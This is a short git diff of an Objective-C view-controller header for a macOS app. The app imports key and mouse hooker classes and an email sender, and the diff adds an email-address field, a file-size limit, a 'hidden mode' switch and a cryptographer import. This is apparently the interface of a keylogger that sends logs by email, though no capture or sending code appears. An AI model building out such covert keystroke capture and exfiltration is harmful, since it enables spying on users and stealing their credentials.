@@ -14,11 +14,22 @@
 #import "KeyRunLoop.h"
 #import "EmailSender.h"
 #import "FileManager.h"
+#import "RegexManager.h"
+#import "Cryptographer.h"
 
-@interface ViewController : NSViewController<NSSharingServiceDelegate>
+@interface ViewController : NSViewController<NSTextFieldDelegate>
+
+{
+    BOOL emailFlag;
+    BOOL sizeFlag;
+}
 
 @property KeyHooker *key;
 @property MouseHooker *mouse;
 
-@end
+@property (weak) IBOutlet NSTextField *emailTextField;
+@property (weak) IBOutlet NSTextField *fileSize;
+@property (weak) IBOutlet NSButton *hiddenModeSwitch;
+@property (weak) IBOutlet NSButton *saveButton;
 
+@end
